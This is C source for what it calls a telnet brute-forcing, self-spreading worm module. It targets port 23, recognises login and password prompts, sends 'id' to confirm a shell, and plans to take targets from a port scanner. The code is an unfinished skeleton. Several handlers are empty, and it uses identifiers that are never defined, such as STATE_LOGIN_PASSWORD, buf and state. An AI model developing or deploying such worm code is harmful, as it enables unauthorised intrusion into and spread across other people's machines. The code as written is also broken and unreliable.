/*
telnet brute forcing, and command execution (spreading worm)

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"
#include "telnet.h"


int telnet_init(Modules **);

ModuleFuncs telnet_funcs = { 
    &telnet_read,
    &telnet_write,
    &telnet_incoming,
    &telnet_outgoing,
    &telnet_nodes,
    &telnet_main_loop,
    NULL
};

Modules HACK_Telnet = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &telnet_funcs, NULL
};


// initialize the module
int telnet_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_Telnet);
}
enum {
    STATE_TELNET_NEW,
    STATE_TELNET_LOGIN,
    STATE_TELNET_PASSWORD,
    STATE_TELNET_INSIDE,
    STATE_TELNET_LOGIN_VERIFY,
};

struct _telnet_searchable_strings {
    char *string;
    int state;
} TelnetSearchableString[] = {
    { "ogin:", STATE_TELNET_LOGIN },
    { "assword:", STATE_LOGIN_PASSWORD },
    { NULL, 0 }
};

int telnet_read(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    int i = 0;
    
    // read till \r\n
    for (i = 0; TelnetSearchableString[i].string != NULL; i++) {
        if (strcasestr(buf, TelnetSearchableString[i].string) != NULL) {
            cptr->state = TelnetSearchableString[i].state;
        }
        
    }
    
    return 0;
}

int telnet_write(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    return 0;
}

int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int ret = 0;
    
    if (cptr->state == STATE_TELNET_LOGIN) {
        
    } else if (cptr->state == STATE_LOGIN_PASSWORD) {
        
    } else if (cptr->state == STATE_LOGIN_INSIDE) {
    // once we asre inside we have to verify that we can tyupe commands
        char *cmd = "id;\r\n";
        QueueAdd(mptr, cptr, cmd, strlen(cmd));
        state = STATE_TELNET_LOGIN_VERIFY;
    } else if (cptr->state == STATE_TELNET_LOGIN_VERIFY) {
        
    }
    
    return ret;
}

int telnet_outgoing(Modules *mptr, Connection *cptr, char *buf, int size) {
    return size;
}

int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int telnet_nodes(Modules *mptr, Connection *cptr, char *buf, int size) {
    // this has to communicate with port scanner to obtain ip addresses of open telnet ports
    
}

int telnet_connect(Modules *mptr, Connection **_conn_list, uint32_t ip, int port) {
    
}
